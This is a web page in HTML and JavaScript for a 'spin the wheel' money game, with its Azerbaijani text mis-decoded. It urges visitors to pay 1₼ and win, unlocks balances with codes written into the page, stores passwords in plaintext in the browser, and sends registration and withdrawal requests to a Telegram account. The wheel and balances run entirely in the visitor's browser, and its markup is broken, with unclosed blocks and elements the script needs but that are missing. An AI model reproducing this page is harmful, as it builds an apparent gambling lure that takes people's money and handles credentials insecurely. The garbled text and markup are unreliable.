<body>

<div class="container">

√áarxńĪ fńĪrlat, h…ôy…ôcanńĪ hiss et v…ô qazancńĪnńĪ artńĪr!<br>
H…ôr fńĪrlatma s…ônin √ľ√ß√ľn yeni s√ľrprizl…ôr v…ô bonuslar a√ßńĪr.<br>
Gecikm…ô ‚Äď indi 1‚āľ …ôlav…ô et v…ô ŇüansńĪnńĪ sńĪnayaraq qazan!
</div>

<!-- LOGIN -->
<div id="login">

<input id="loginUser" placeholder="ńįstifad…ô√ßi adńĪ">
<input id="loginCode" placeholder="Kod">
<button onclick="login()">Daxil ol</button>

<p><button onclick="showRegister()">Qeydiyyatdan ke√ß</button></p>
</div>

<!-- REGISTER -->
<div id="register" class="hidden">
<h2>Qeydiyyat</h2>
<input id="regUser" placeholder="ńįstifad…ô√ßi adńĪ">
<input id="regEmail" placeholder="Email">

<!-- PANEL -->
<div id="panel" class="hidden">

<script>
// Tarix v…ô saat
function showDateTime(){
    const now = new Date();
    const days = ["Bazar","Bazar ert…ôsi","√á…ôrŇü…ônb…ô axŇüamńĪ","√á…ôrŇü…ônb…ô","C√ľm…ô axŇüamńĪ","C√ľm…ô","Ňě…ônb…ô"];
    const dayName = days[now.getDay()];
    const day = now.getDate().toString().padStart(2,"0");
    const month = (now.getMonth()+1).toString().padStart(2,"0");
    const year = now.getFullYear();
    const hour = now.getHours().toString().padStart(2,"0");
    const minute = now.getMinutes().toString().padStart(2,"0");
    document.getElementById("dateTime").innerText = `${dayName}, ${day}/${month}/${year} ${hour}:${minute}`;
}
showDateTime();
setInterval(showDateTime,60000);

// Kodlar v…ô balans
let balance = 0;
let deg = 0;
const codeMap = { "005":1, "00-MH":5, "00-7A":10, "00-6T":3, "00-63U":20 };

// √áarx b√∂lm…ôl…ôri
const slices = [
  { text:"50 ‚āľ", color:"#ff4d4d", value:50 },
  { text:"100 ‚āľ", color:"#4dff4d", value:100 },
  { text:"BOŇě", color:"#4d4dff", value:0 },
  { text:"BOŇě", color:"#ffff4d", value:0 },
  { text:"BOŇě", color:"#ff4dff", value:0 },
  { text:"BOŇě", color:"#4dffff", value:0 }
];

// DRAW WHEEL
function drawWheel(){
  const svg = document.getElementById("wheel");
  svg.innerHTML = "";
  const cx = 125, cy = 125, r=120;
  const sliceAngle = 360 / slices.length;
  slices.forEach((slice,i)=>{
    const startAngle = sliceAngle*i;
    const endAngle = startAngle + sliceAngle;
    const rad1 = (startAngle-90)*Math.PI/180;
    const rad2 = (endAngle-90)*Math.PI/180;
    const x1 = cx + r*Math.cos(rad1);
    const y1 = cy + r*Math.sin(rad1);
    const x2 = cx + r*Math.cos(rad2);
    const y2 = cy + r*Math.sin(rad2);
    const path = document.createElementNS("http://www.w3.org/2000/svg","path");
    path.setAttribute("d",`M ${cx} ${cy} L ${x1} ${y1} A ${r} ${r} 0 0 1 ${x2} ${y2} Z`);
    path.setAttribute("fill",slice.color);
    svg.appendChild(path);
    const angle = (startAngle + sliceAngle/2 - 90) * Math.PI/180;
    const tx = cx + r*0.65*Math.cos(angle);
    const ty = cy + r*0.65*Math.sin(angle);
    const text = document.createElementNS("http://www.w3.org/2000/svg","text");
    text.setAttribute("x",tx);
    text.setAttribute("y",ty);
    text.textContent = slice.text;
    text.setAttribute("fill","white");
    text.setAttribute("text-anchor","middle");
    text.setAttribute("dominant-baseline","middle");
    svg.appendChild(text);
  });
}
drawWheel();

// SHOW REGISTER
function showRegister(){
  document.getElementById("login").classList.add("hidden");
  document.getElementById("register").classList.remove("hidden");
}

// REGISTER
function register(){
  const user=document.getElementById("regUser").value.trim();
  const email=document.getElementById("regEmail").value.trim();
  const pass=document.getElementById("regPass").value.trim();
  if(!user||!email||!pass){ 
    document.getElementById("regMsg").innerText="B√ľt√ľn xanalarńĪ doldur!"; 
    return;
  }
  localStorage.setItem("userData",JSON.stringify({user,email,pass}));
  document.getElementById("regMsg").innerText="1 saniy…ô g√∂zl…ôyin, Telegrama y√∂nl…ôndirilirsiz...";
  setTimeout(()=>{
    const message=`M…ôn qeydiyyatdan ke√ßdim, hesabńĪmńĪ aktiv edin.\nńįstifad…ô√ßi adńĪ: ${user}\nEmail: ${email}`;
    window.open("https://t.me/carxfirla?text="+encodeURIComponent(message),"_blank");
  },1000);
}

// LOGIN
function login(){
  const user=document.getElementById("loginUser").value.trim();
  const code=document.getElementById("loginCode").value.trim();
  const msg=document.getElementById("msg");
  if(!user||!code){ msg.innerText="B√ľt√ľn xanalarńĪ doldurun!"; return;}
  if(!codeMap[code]){ msg.innerText="Kod s…ôhvdir. Yeni kod √ľ√ß√ľn Telegram vasit…ôsil…ô …ôlaq…ô saxlayńĪn."; return;}
  balance = codeMap[code];
  document.getElementById("login").classList.add("hidden");
  document.getElementById("register").classList.add("hidden");
  document.getElementById("panel").classList.remove("hidden");
  document.getElementById("msg").innerText="GiriŇü uńüurlu! √áarx paneli a√ßńĪldńĪ.";
  updateBalance();
}

// UPDATE BALANCE
function updateBalance(){ document.getElementById("balanceText").innerText="Balans: "+balance+" ‚āľ"; }

// SPIN
function spin(){
  if(balance<=0){ document.getElementById("msgSpin").innerText="Balans yoxdur!"; return;}
  const sliceIndex = Math.floor(Math.random()*slices.length);
  const slice = slices[sliceIndex];
  deg += 360*5 + sliceIndex*(360/slices.length);
  document.getElementById("wheel").style.transform=`rotate(${deg}deg)`;

  setTimeout(()=>{
    if(slice.value>0){
      balance += slice.value-1; // fńĪrlatma x…ôrci 1‚āľ
      document.getElementById("msgSpin").innerText=`T…ôbrikl…ôr! ${slice.text} qazandńĪnńĪz!`;
    } else {
      document.getElementById("msgSpin").innerText="B…ôxtinizi Bir Daha SńĪnaayńĪn ūüėě";
      balance -=1;
    }
    updateBalance();
  },3000);
}

// PUL √áIXARTMAQ
function withdraw(){
  if(balance < 50){
    alert("Minimum 50‚āľ lazńĪmdńĪr!");
    return;
  }
  const message = `Salam m…ônim hesabńĪmda ${balance}‚āľ var, √ßńĪxarńĪŇü ed…ôrdiniz z…ôhm…ôt olmasa.`;
  window.open("https://t.me/carxfirla?text=" + encodeURIComponent(message), "_blank");
}
</script>
